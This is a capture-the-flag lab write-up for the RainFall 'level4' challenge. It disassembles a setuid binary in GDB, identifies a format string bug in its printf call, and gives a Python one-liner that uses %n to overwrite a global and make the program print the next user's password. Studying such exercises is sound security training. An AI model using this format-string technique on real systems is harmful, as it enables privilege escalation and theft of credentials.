# Level4

## Walkthrough

We list the files in the current home directory.

```bash
level4@RainFall:~$ ls -la
total 17
dr-xr-x---+ 1 level4 level4   80 Mar  6  2016 .
dr-x--x--x  1 root   root    340 Sep 23  2015 ..
-rw-r--r--  1 level4 level4  220 Apr  3  2012 .bash_logout
-rw-r--r--  1 level4 level4 3530 Sep 23  2015 .bashrc
-rwsr-s---+ 1 level5 users  5252 Mar  6  2016 level4
-rw-r--r--+ 1 level4 level4   65 Sep 23  2015 .pass
-rw-r--r--  1 level4 level4  675 Apr  3  2012 .profile
level4@RainFall:~$ file ./level4
./level4: setuid setgid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=0xf8cb2bdaa7daab1347b36aaf1c98d49529c605db, not stripped
```

The file is owned by **level5** and has the **setuid** bit.

We list the functions inside the executable and analyze their assembly code with **GDB**.

```
(gdb) info functions
All defined functions:

Non-debugging symbols:
0x080482f8  _init
0x08048340  printf
0x08048340  printf@plt
0x08048350  fgets
0x08048350  fgets@plt
0x08048360  system
0x08048360  system@plt
0x08048370  __gmon_start__
0x08048370  __gmon_start__@plt
0x08048380  __libc_start_main
0x08048380  __libc_start_main@plt
0x08048390  _start
0x080483c0  __do_global_dtors_aux
0x08048420  frame_dummy
0x08048444  p
0x08048457  n
0x080484a7  main
0x080484c0  __libc_csu_init
0x08048530  __libc_csu_fini
0x08048532  __i686.get_pc_thunk.bx
0x08048540  __do_global_ctors_aux
0x0804856c  _fini
```

There are 3 interesting functions: `main()`, `p()` and `n()`.

```
(gdb) disas main
Dump of assembler code for function main:
   0x080484a7 <+0>:     push   ebp
   0x080484a8 <+1>:     mov    ebp,esp
   0x080484aa <+3>:     and    esp,0xfffffff0
   0x080484ad <+6>:     call   0x8048457 <n>
   0x080484b2 <+11>:    leave
   0x080484b3 <+12>:    ret
End of assembler dump.
```

The `main()` function only calls the `n()` function.

```
(gdb) disas n
Dump of assembler code for function n:
   0x08048457 <+0>:     push   ebp
   0x08048458 <+1>:     mov    ebp,esp
   0x0804845a <+3>:     sub    esp,0x218
   0x08048460 <+9>:     mov    eax,ds:0x8049804
   0x08048465 <+14>:    mov    DWORD PTR [esp+0x8],eax
   0x08048469 <+18>:    mov    DWORD PTR [esp+0x4],0x200
   0x08048471 <+26>:    lea    eax,[ebp-0x208]
   0x08048477 <+32>:    mov    DWORD PTR [esp],eax
   0x0804847a <+35>:    call   0x8048350 <fgets@plt>
   0x0804847f <+40>:    lea    eax,[ebp-0x208]
   0x08048485 <+46>:    mov    DWORD PTR [esp],eax
   0x08048488 <+49>:    call   0x8048444 <p>
   0x0804848d <+54>:    mov    eax,ds:0x8049810
   0x08048492 <+59>:    cmp    eax,0x1025544
   0x08048497 <+64>:    jne    0x80484a5 <n+78>
   0x08048499 <+66>:    mov    DWORD PTR [esp],0x8048590
   0x080484a0 <+73>:    call   0x8048360 <system@plt>
   0x080484a5 <+78>:    leave
   0x080484a6 <+79>:    ret
End of assembler dump.

```

The `n()` function:
- calls `fgets()` to read input into a buffer located at `ebp - 0x208`
- calls the function `p()`
- retrieves the value of a global variable stored at memory address `0x8049810` into the `eax` register
- Compares the value of `eax` with `0x1025544` (16930116 in decimal) and calls `system("/bin/cat /home/user/level5/.pass")` if the condition is met

```
Dump of assembler code for function p:
   0x08048444 <+0>:     push   ebp
   0x08048445 <+1>:     mov    ebp,esp
   0x08048447 <+3>:     sub    esp,0x18
   0x0804844a <+6>:     mov    eax,DWORD PTR [ebp+0x8]
   0x0804844d <+9>:     mov    DWORD PTR [esp],eax
   0x08048450 <+12>:    call   0x8048340 <printf@plt>
   0x08048455 <+17>:    leave
   0x08048456 <+18>:    ret
End of assembler dump.
```

The `p()` function only calls `printf()` to print the buffer to stdout

Similar to the previous level, this function is vulnerable to a **format string attack** and the method to complete it will be the same. The only differences are the comparison with a higher number, and a deeper position of the format string in the stack due to the various function calls.

Do not hesitate to check the `README` for the previous level in order to understand the logic behind our solution.

```
(gdb) b printf
Breakpoint 1 at 0x8048340
(gdb) r
Starting program: /home/user/level4/level4 
AAAA

Breakpoint 1, 0xb7e78850 in printf () from /lib/i386-linux-gnu/libc.so.6
(gdb) stepi
0xb7e78851 in printf () from /lib/i386-linux-gnu/libc.so.6
(gdb) info registers
eax            0xbffff430       -1073744848
ecx            0xb7fda005       -1208115195
edx            0xb7fd28c4       -1208145724
ebx            0xb7fd0ff4       -1208152076
esp            0xbffff3f8       0xbffff3f8
ebp            0xbffff418       0xbffff418
esi            0x0	0
edi            0x0	0
eip            0xb7e78851       0xb7e78851 <printf+1>
eflags         0x200296	[ PF AF SF IF ID ]
cs             0x73     115
ss             0x7b     123
ds             0x7b     123
es             0x7b     123
fs             0x0      0
gs             0x33     51
(gdb) x/16wx 0xbffff3f8
0xbffff3f8:     0xb7fd0ff4     0x08048455     0xbffff430     0xb7ff26b0
0xbffff408:     0xbffff674     0xb7fd0ff4     0x00000000     0x00000000
0xbffff418:     0xbffff638     0x0804848d     0xbffff430     0x00000200
0xbffff428:     0xb7fd1ac0     0xb7ff37d0     0x41414141     0xb7e2000a
```

```bash
python -c "print('\x10\x98\x04\x08' + '%8x' * 10 + '%16930032x' + '%n')" | ./level4
```
